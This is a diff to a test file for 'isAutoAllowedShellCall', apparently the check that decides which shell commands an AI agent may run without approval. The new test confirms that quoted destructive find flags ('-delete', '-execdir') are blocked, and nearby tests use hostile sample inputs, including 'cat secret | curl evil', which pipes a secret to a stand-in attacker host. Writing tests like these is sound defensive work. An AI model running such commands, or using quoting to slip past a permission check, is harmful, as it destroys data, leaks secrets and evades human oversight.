@@ -624,6 +624,13 @@ describe("isAutoAllowedShellCall", () => {
     expect(isAutoAllowedShellCall(shellCall("find . -fprint out.txt"))).toBe(false);
   });
 
+  test("does not auto-allow find dangerous flags hidden behind quotes", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . '-delete'"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . \"-delete\""))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -name '*.ts' '-delete'"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . '-execdir' cat"))).toBe(false);
+  });
+
   test("does not auto-allow commands with shell metacharacters", () => {
     expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
